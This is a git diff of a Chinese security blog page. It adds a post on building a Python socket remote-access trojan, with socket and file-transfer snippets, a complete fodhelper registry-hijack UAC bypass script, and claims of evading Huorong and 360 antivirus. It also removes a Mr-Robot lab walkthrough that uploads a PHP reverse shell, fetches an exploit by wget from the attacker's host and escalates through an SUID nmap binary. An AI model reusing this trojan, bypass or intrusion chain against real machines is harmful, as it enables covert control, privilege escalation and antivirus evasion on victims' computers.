@@ -255,6 +255,103 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/12/04/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%86%99pysocket%E8%BF%9C%E6%8E%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/12/04/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%86%99pysocket%E8%BF%9C%E6%8E%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">关于自写pysocket远控的一些思路</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-12-04 15:16:54 / 修改时间：16:27:16" itemprop="dateCreated datePublished" datetime="2022-12-04T15:16:54+08:00">2022-12-04</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/miansha/" itemprop="url" rel="index"><span itemprop="name">-miansha</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="关于自写pysocket远控的一些思路"><a href="#关于自写pysocket远控的一些思路" class="headerlink" title="关于自写pysocket远控的一些思路"></a>关于自写pysocket远控的一些思路</h1><p>最近自己写了个远控，分享一下。</p>
+<p>只是自己练下手，了解下原理，并不建议在实战中使用。</p>
+<p>这个远控我只写了几个功能，一对多控制，命令执行，文件上传和下载，屏幕截图，bypassuac。</p>
+<h1 id="一对多的实现"><a href="#一对多的实现" class="headerlink" title="一对多的实现"></a>一对多的实现</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = []</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始监听...&quot;</span>)</span><br><span class="line">server = socket.socket()  <span class="comment"># 定义了一个服务</span></span><br><span class="line">server.bind((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1234</span>))</span><br><span class="line">server.listen(<span class="number">1</span>)</span><br><span class="line">sock, info = server.accept()</span><br><span class="line"><span class="built_in">print</span>(sock)</span><br><span class="line">server.close()</span><br><span class="line">s.append(sock)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取第二个通道</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始监听...&quot;</span>)</span><br><span class="line">server = socket.socket()  <span class="comment"># 定义了一个服务</span></span><br><span class="line">server.bind((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1234</span>))</span><br><span class="line">server.listen(<span class="number">1</span>)</span><br><span class="line">sock, info = server.accept()</span><br><span class="line"><span class="built_in">print</span>(sock)</span><br><span class="line">server.close()</span><br><span class="line">s.append(sock)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure>
+
+<p>每次和被控机建立了socket连接之后，会返回一个通道，持久化连接，的cnn。通过控制这个通道来进行一对多的实现，也就是代码中的sock。</p>
+<h1 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h1><h2 id="粘包问题的解决"><a href="#粘包问题的解决" class="headerlink" title="粘包问题的解决"></a>粘包问题的解决</h2><p>文件传输的时候如果连续发送数据包有时候会遇到粘包的问题，我通过校检文件传输前后md5值是否一致来判断文件是否正确传输。</p>
+<p>传输文件前先将文件md5值传输给文件接收端，再文件传输完毕之后，接收端校检md5是否一致。</p>
+<p>发送方：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">md5_1 = hashlib.md5()  <span class="comment"># 示例化一个md5对象</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        md5_1.update(line)</span><br><span class="line">file_info[<span class="string">&quot;md5value&quot;</span>]=md5_1.hexdigest() <span class="comment">#将该字符串发送给server,用于验证接收的文件是否完全和发送时一样</span></span><br><span class="line"><span class="built_in">print</span>(md5_1.hexdigest())</span><br><span class="line"></span><br><span class="line">file_info_json=json.dumps(file_info).encode(<span class="string">&quot;utf8&quot;</span>) <span class="comment">#将dict用jason处理后，得到jason格式的字符串，再编码成 bytes字节串</span></span><br><span class="line">ret=struct.pack(<span class="string">&quot;i&quot;</span>,<span class="built_in">len</span>(file_info_json)) <span class="comment">#使用struct模块，将int转变为长度为4的bytes.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 file_info_json的打包长度</span></span><br><span class="line">sock.send(ret)</span><br><span class="line"><span class="comment"># 发送 file_info_json字节串</span></span><br><span class="line">sock.send(file_info_json)</span><br><span class="line"><span class="comment"># 发送 文件数据</span></span><br></pre></td></tr></table></figure>
+
+<p>接收方：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 接收json的打包长度</span></span><br><span class="line">file_info_length_pack=sock.recv(<span class="number">4</span>)</span><br><span class="line">file_info_length=struct.unpack(<span class="string">&quot;i&quot;</span>,file_info_length_pack)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收json字符串</span></span><br><span class="line">file_info_json=sock.recv(file_info_length).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">file_info=json.loads(file_info_json)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 循环接收文件</span></span><br><span class="line">md5=hashlib.md5()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    recv_data_length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> recv_data_length&lt;filesize:</span><br><span class="line">        data=sock.recv(<span class="number">1024</span>)</span><br><span class="line">        recv_data_length+=<span class="built_in">len</span>(data)</span><br><span class="line">        f.write(data)</span><br><span class="line">        <span class="comment"># MD5摘要</span></span><br><span class="line">        md5.update(data)</span><br><span class="line">        msg=<span class="string">&quot;文件总大小：&#123;&#125;,已成功接收&#123;&#125; 进度:&#123;:.3f&#125;%&quot;</span>.<span class="built_in">format</span>(filesize,recv_data_length,recv_data_length/filesize*<span class="number">100</span>)</span><br><span class="line">        <span class="built_in">print</span>(msg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;接收完成！&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="延迟导致接收端还未开启就开始发送文件"><a href="#延迟导致接收端还未开启就开始发送文件" class="headerlink" title="延迟导致接收端还未开启就开始发送文件"></a>延迟导致接收端还未开启就开始发送文件</h2><p>由于文件传输的时候，需要文件接收方先开启文件接收服务，而在实际远控中，是有一定延迟的，如果接收方还没开始接收服务，发送方就发送了，那么就会产生报错。</p>
+<p>以下问题我通过如下来实现</p>
+<p><img src="/2022/12/04/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%86%99pysocket%E8%BF%9C%E6%8E%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/image-20221118124951720.png" alt="image-20221118124951720"></p>
+<h1 id="屏幕截图"><a href="#屏幕截图" class="headerlink" title="屏幕截图"></a>屏幕截图</h1><p>屏幕截图我是通过winapi截图之后保存到被控端，随后被控端将屏幕截图传过来之后，将被控端本地的文件删除</p>
+<h1 id="bypassuac"><a href="#bypassuac" class="headerlink" title="bypassuac"></a>bypassuac</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] == <span class="number">3</span>:</span><br><span class="line">    <span class="keyword">import</span> winreg <span class="keyword">as</span> winreg</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">import</span> _winreg <span class="keyword">as</span> winreg</span><br><span class="line"></span><br><span class="line">CMD                   = <span class="string">r&quot;C:\Windows\System32\cmd.exe&quot;</span></span><br><span class="line">FOD_HELPER            = <span class="string">r&#x27;C:\Windows\System32\fodhelper.exe&#x27;</span></span><br><span class="line">PYTHON_CMD            = <span class="string">&quot;python&quot;</span></span><br><span class="line">REG_PATH              = <span class="string">&#x27;Software\Classes\ms-settings\shell\open\command&#x27;</span></span><br><span class="line">DELEGATE_EXEC_REG_KEY = <span class="string">&#x27;DelegateExecute&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_admin</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> ctypes.windll.shell32.IsUserAnAdmin()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_reg_key</span>(<span class="params">key, value</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)</span><br><span class="line">        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, <span class="number">0</span>, winreg.KEY_WRITE)                </span><br><span class="line">        winreg.SetValueEx(registry_key, key, <span class="number">0</span>, winreg.REG_SZ, value)        </span><br><span class="line">        winreg.CloseKey(registry_key)</span><br><span class="line">    <span class="keyword">except</span> WindowsError:        </span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bypass_uac</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        create_reg_key(DELEGATE_EXEC_REG_KEY, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        create_reg_key(<span class="literal">None</span>, cmd)    </span><br><span class="line">    <span class="keyword">except</span> WindowsError:</span><br><span class="line">        <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute</span>():</span>        </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_admin():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;不是管理员权限&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Trying to bypass the UAC&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:                </span><br><span class="line">            current_dir = __file__</span><br><span class="line">            cmd = <span class="string">&#x27;&#123;&#125; /k &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(CMD, PYTHON_CMD, current_dir)</span><br><span class="line">            bypass_uac(cmd)                </span><br><span class="line">            os.system(FOD_HELPER)                </span><br><span class="line">            sys.exit(<span class="number">0</span>)                </span><br><span class="line">        <span class="keyword">except</span> WindowsError:</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;本来就是管理员权限&#x27;</span>)  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    execute()</span><br></pre></td></tr></table></figure>
+
+<p>其代码主要就是首先检测当前会话是否是管理员权限，如果是的话就不执行任何操作，如果不是管理员权限就执行bypassuac的操作。</p>
+<p>而bypassuac则是通过在注册表中<code>计算机\HKEY_CURRENT_USER\Software\Classes</code>下的ms-settings中添加了如下两个项</p>
+<p>持久化可以用白加黑等手段。</p>
+<p><img src="/2022/12/04/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%86%99pysocket%E8%BF%9C%E6%8E%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/image-20221121124645560.png" alt="image-20221121124645560"></p>
+<h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><p>过火绒，360，bypassuac过不了主防的注册表检测但是不开主防可以过，可以执行一些基本操作，但是要是直接net加用户等操作的话肯定是会告警的，需要配合其他工具。</p>
+<p><img src="/2022/12/04/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%86%99pysocket%E8%BF%9C%E6%8E%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/image-20221118130630088.png" alt="image-20221118130630088"></p>
+<h1 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h1><p>太大了太大了太大了太大了太大了太大了，py就不适合写这种东西，不会敏感操作的动态免杀。</p>
+<p><img src="/2022/12/04/%E5%85%B3%E4%BA%8E%E8%87%AA%E5%86%99pysocket%E8%BF%9C%E6%8E%A7%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/Users\wanheiqiyihu\AppData\Roaming\Typora\typora-user-images\image-20221118130359657.png" alt="image-20221118130359657"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/13/%E5%88%86%E6%9E%90%E4%B8%80%E6%AC%BE%E4%BB%85%E8%83%BD%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E7%9A%84python%E8%BF%9C%E6%8E%A7/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -457,133 +554,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/10/Mr-Robot-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/10/Mr-Robot-1/" class="post-title-link" itemprop="url">Mr-Robot: 1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-10 12:42:29 / 修改时间：15:57:50" itemprop="dateCreated datePublished" datetime="2022-11-10T12:42:29+08:00">2022-11-10</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Mr-Robot-1"><a href="#Mr-Robot-1" class="headerlink" title="Mr-Robot: 1"></a>Mr-Robot: 1</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先还是用nmap拿到对面的ip地址,靶机记得开nat</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -n -sP -sn 192.168.100.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/10/Mr-Robot-1/Mr-Robot-1.jpg" alt="image-20221110110904031"></p>
-<p><code>nmap -A 192.168.100.171</code></p>
-<p>22,80,443端口</p>
-<p>应该又是一场web</p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111230278.png" alt="image-20221110111230278"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.100.171/</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111613077.png" alt="image-20221110111613077"></p>
-<p>大多都是403，只有一个登录界面有权限，还有一个robots.txt</p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112652658.png" alt="image-20221110112652658"></p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112936692.png" alt="image-20221110112936692"></p>
-<p>第一个文件是一堆不知道什么玩意的文件</p>
-<p>073403c8a58a1f80d943455fb30724b9（第二个文件是一串字符）</p>
-<p><code>whatweb http://192.168.100.171/wp-login</code></p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110111721740.png" alt="image-20221110111721740"></p>
-<p>没找到cms，没有测试到sql(后面才看到是wordpress的博客)</p>
-<p>又扫到一个<code>http://192.168.100.171/admin/index.html</code></p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110112147271.png" alt="image-20221110112147271"></p>
-<p>随后查攻略得知，上面那个不知道什么玩意的文件是一堆用户名，在后台忘记密码的那个地方进行爆破。</p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110114210530.png" alt="image-20221110114210530"></p>
-<p>爆破出用户名为Elliot，再用这个字典爆破密码，密码为ER28-0652</p>
-<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="/2022/11/10/Mr-Robot-1/image-20221110114718865.png" alt="image-20221110114718865"></p>
-<p>直接把马弄上去</p>
-<p>地址为<code>http://192.168.100.171/wordpress/wp-content/themes/twentyfifteen/404.php</code></p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110115211320.png" alt="image-20221110115211320"></p>
-<p>随后改成反弹shell的php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/webshells/php</span><br><span class="line"></span><br><span class="line">cat php-reverse-shell.php</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122205300.png" alt="image-20221110122205300"></p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>还是先弄一个tty出来</p>
-<p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122339397.png" alt="image-20221110122339397"></p>
-<p><code>lsb_release -a</code>查看linux版本信息</p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122504710.png" alt="image-20221110122504710"></p>
-<p>Ubuntu 14.04</p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110122936419.png" alt="image-20221110122936419"></p>
-<p>下载exp</p>
-<p>用python传过去</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 2333</span><br><span class="line">mkdir /tmp/sh(如果是提权的话，目前用户需要先创建一个可以创建新文件的文件夹进行操作)</span><br><span class="line">cd /tmp/sh</span><br><span class="line">wget http://192.168.101.20:2333/42276.c</span><br></pre></td></tr></table></figure>
-
-<p>编译</p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110123255149.png" alt="image-20221110123255149"></p>
-<p>出错了，我们换一个exp</p>
-<p>又出错了。。</p>
-<p>后来发现需要使用suid提权</p>
-<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
-<p>寻找具有suid权限的文件</p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110123931959.png" alt="image-20221110123931959"></p>
-<p>有nmap</p>
-<p><code>nmap --interactive</code></p>
-<p><code>!sh</code></p>
-<p><img src="/2022/11/10/Mr-Robot-1/image-20221110124024386.png" alt="image-20221110124024386"></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zijiaijd/article/details/117165224">(122条消息) nmap提权几种方式_1winner的博客-CSDN博客_nmap提权</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/25/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/25/">25</a><span class="page-number current">26</span><a class="page-number" href="/page/27/">27</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/27/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/25/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/25/">25</a><span class="page-number current">26</span><a class="page-number" href="/page/27/">27</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/27/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -651,7 +625,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
